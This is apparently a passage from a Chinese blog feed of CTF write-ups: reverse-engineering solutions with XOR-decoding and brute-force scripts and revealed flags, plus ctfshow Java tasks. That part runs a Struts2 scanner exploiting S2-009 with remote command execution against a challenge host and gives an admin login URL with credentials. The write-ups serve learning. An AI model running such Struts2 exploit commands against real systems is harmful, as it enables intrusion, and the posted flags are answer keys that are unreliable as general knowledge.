class="line"></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">hexencode</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> encoded = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    foreach (c; s) &#123;</span><br><span class="line">        encoded ~= format(<span class="string">&quot;%02x&quot;</span>, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> encoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> enc_flag = encrypt(<span class="string">&quot;flag&#123;t3mplat3_met4pr0gramming_is_gr8_4_3very0n3&#125;&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    writeln(<span class="string">&quot;Your hexencoded, encrypted flag is: &quot;</span>, enc_flag.hexencode);</span><br><span class="line">    writeln(<span class="string">&quot;I generated it at compile time. :)&quot;</span>);</span><br><span class="line">    writeln(<span class="string">&quot;Can you decrypt it for me?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实很显眼的可以看到flag的存在！<br><img src="https://img-blog.csdnimg.cn/20210407212948895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>如果没有源代码做的话，估计要远程调试！<img src="https://img-blog.csdnimg.cn/20210407213707995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们接着调试！<br>调试半天不出来！<br>这里先空着！等有时间再看看！</p><hr /><h1 id="zorropub"><a href="#zorropub" class="headerlink" title="zorropub"></a>zorropub</h1><p>里面有许多字符，经过翻译是个劝酒喝酒喝饮料的程序。<br>EP再ida打开去分析里面的一些内容！<br><img src="https://img-blog.csdnimg.cn/20210408190332831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对了，这里有句话说错了，就是v6是在16之上！接着看看！<br><img src="https://img-blog.csdnimg.cn/20210408190806665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>大致理解了里面的思路，我便用kali进行运行但是报错了！<br><img src="https://img-blog.csdnimg.cn/20210408191311671.png" alt="在这里插入图片描述"><br>所以这个思路是行不通的！<br>此时再来列一下各个函数</p><blockquote><p>MD5Init是一个初始化函数，初始化核心变量，装入标准的幻数<br>MD5Update是MD5的主计算过程<br>MD5Final整理和填写输出结果<br>int sprintf(char *str, const char *format, …) 发送格式化输出到 str 所指向的字符串。</p></blockquote><p>好了，就说这么多吧，最简单的思路就是爆破！<br>首先是用pwntools库来进行爆破，但是这样子没能成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> v6 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>,<span class="number">0xffff</span>):</span><br><span class="line">    v9 = <span class="number">0</span></span><br><span class="line">    seed = <span class="number">0</span></span><br><span class="line">    seed ^= v6</span><br><span class="line">    i = seed</span><br><span class="line">    <span class="keyword">while</span>(i):</span><br><span class="line">        v9 = v9 + <span class="number">1</span></span><br><span class="line">        i &amp;= i - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> v9 == <span class="number">10</span>:</span><br><span class="line">        a.append(v6)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./87356aae634e4e0a9a081f30fc81fe16&#x27;</span>)</span><br><span class="line">     r.recv()</span><br><span class="line">      r.sendline(<span class="string">&#x27;1&#x27;</span>)<span class="comment">#这里会出错，不知这么回事？</span></span><br><span class="line">      r.recv()</span><br><span class="line">      r.sendline(<span class="built_in">str</span>(i))</span><br><span class="line">      r.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;null&quot;</span> <span class="keyword">in</span> text:</span><br><span class="line">        print(text)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><p>这样子总是会出错！<br>但是不要着急，还有一个重要的库python subprocess模块<br>通过标准库中的subprocess包来fork一个子进程，并运行一个外部的程序。<br><img src="https://img-blog.csdnimg.cn/20210408201958892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后我看到它是64位，不能用OD，就想打开xdbg64，但是还是不行，因为他是个ELF文件！dgb又不想用，就放这吧！</p><p><strong>nullcon{nu11c0n_s4yz_x0r1n6_1s_4m4z1ng}</strong></p><hr /><h1 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h1><p>这里首先进行EP探查，发现有个壳，但是属于未知壳，所以还是使用OD进行脱壳，进入是会提示说代码有压缩，我们不用管！<br><img src="https://img-blog.csdnimg.cn/20210416094506761.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后使用ODdumop插件进行脱壳！生成一个新的没有壳的文件！然后就可以用ida进行打开了，不过时无法进行运行的！但是我们静态分析已经足够了！<br>来来分析一波这道题！<br><img src="https://img-blog.csdnimg.cn/20210421205423614.png" alt="在这里插入图片描述"><br>进去！<br><img src="https://img-blog.csdnimg.cn/20210421210206227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p>memcpy指的是C和C++使用的内存拷贝函数，函数原型为void *memcpy(void *destin, void *source, unsigned n)；函数的功能是从源内存地址的起始位置开始拷贝若干个字节到目标内存地址中，即从源source中拷贝n个字节到目标destin中。<br><br>sprintf指的是字符串格式化命令，函数声明为 int sprintf(char *string, char *format [,argument,…]);，主要功能是把格式化的数据写入某个字符串中，即发送格式化输出到 string 所指向的字符串。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2021042121091971.png" alt="在这里插入图片描述"><br>我们此时不知道flag是在哪里出现的，所以我们以我们模仿其进下写个脚本，然后将每个过程打印一下就可以了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">array1 &#x3D; [102,109,99,100,127,55,53,48,48,107,58,60,59,32]</span><br><span class="line">array2 &#x3D; [55,111,56,98,54,124,55,51,52,118,51,98,100,122]</span><br><span class="line">array3 &#x3D; [26,0,0,81,5,17,84,86,85,89,29,9,93,18,0,0]</span><br></pre></td></tr></table></figure><p>上面是三个数组，此时我再分别看看异或的函数！<br><img src="https://img-blog.csdnimg.cn/20210421212139414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>再来看看第二个异或函数！<br><img src="https://img-blog.csdnimg.cn/20210421212823695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>和第三个异或函数！<br><img src="https://img-blog.csdnimg.cn/20210421213815970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们再将其整合到一起！<br><img src="https://img-blog.csdnimg.cn/20210422142747843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对了，这个图片了的最后一句话有点毛病，不用管它！<br>脚本！来来来！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">array1 = [<span class="number">102</span>,<span class="number">109</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">127</span>,<span class="number">55</span>,<span class="number">53</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">107</span>,<span class="number">58</span>,<span class="number">60</span>,<span class="number">59</span>,<span class="number">32</span>]</span><br><span class="line">array2 = [<span class="number">55</span>,<span class="number">111</span>,<span class="number">56</span>,<span class="number">98</span>,<span class="number">54</span>,<span class="number">124</span>,<span class="number">55</span>,<span class="number">51</span>,<span class="number">52</span>,<span class="number">118</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">100</span>,<span class="number">122</span>]</span><br><span class="line">array3 = [<span class="number">26</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">81</span>,<span class="number">5</span>,<span class="number">17</span>,<span class="number">84</span>,<span class="number">86</span>,<span class="number">85</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">9</span>,<span class="number">93</span>,<span class="number">18</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">v3 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    v3 += <span class="built_in">chr</span>(array1[i]^i)</span><br><span class="line">v5 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">v5 += (<span class="built_in">chr</span>(array2[<span class="number">0</span>]))<span class="comment">#这里就是整合时候添加进去的一个字符！没有这个字符结果会大不一样</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">14</span>):</span><br><span class="line">    v5 += <span class="built_in">chr</span>(array1[i]^array2[i]^array1[i-<span class="number">1</span>])</span><br><span class="line">v7 = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">    v7 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(v5[i])^i^array3[i+<span class="number">1</span>])</span><br><span class="line">byte = <span class="built_in">chr</span>(array2[<span class="number">0</span>]^array3[<span class="number">0</span>])<span class="comment">#这里是在第三个异或函数里面进行添加的字符</span></span><br><span class="line">print(v3,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(v5,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(byte,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(v7,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210422144933501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr /><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1838734762&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-JAVA</title>
      <link href="posts/46785775/"/>
      <url>posts/46785775/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="web279-279"><a href="#web279-279" class="headerlink" title="web279~279"></a>web279~279</h1><p>这里便是跑脚本的事了！<br><img src="https://img-blog.csdnimg.cn/20210416191131112.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python Struts2Scan.py -u http://<span class="number">892</span>a1226-<span class="number">9</span>adc-<span class="number">4</span>c5b-a700-c1ba9ca6ee26.challenge.ctf.show:<span class="number">8080</span>/login.action</span><br><span class="line">然后进行利用</span><br><span class="line">python Struts2Scan.py -u http://<span class="number">892</span>a1226-<span class="number">9</span>adc-<span class="number">4</span>c5b-a700-c1ba9ca6ee26.challenge.ctf.show:<span class="number">8080</span>/login.action -n S2-<span class="number">009</span> --exec</span><br><span class="line">再输出源代码！</span><br><span class="line">env</span><br></pre></td></tr></table></figure><hr /><h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><p>有个附件！<br>正好我以前搞逆向，应该是很简单的！<br>先EP探测一波！再java逆向<br><img src="https://img-blog.csdnimg.cn/20210416192848596.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后进入！<br><img src="https://img-blog.csdnimg.cn/20210416192925539.png" alt="在这里插入图片描述"><br>此时我们便可以登入后台了！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;login?username&#x3D;admin&amp;password&#x3D;ctfshow</span><br></pre></td></tr></table></figure><hr /><h1 id="web299-web300-未做"><a href="#web299-web300-未做" class="headerlink" title="web299~web300(未做)"></a>web299~web300(未做)</h1><p>不会做</p><hr /><p>下面附上代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span 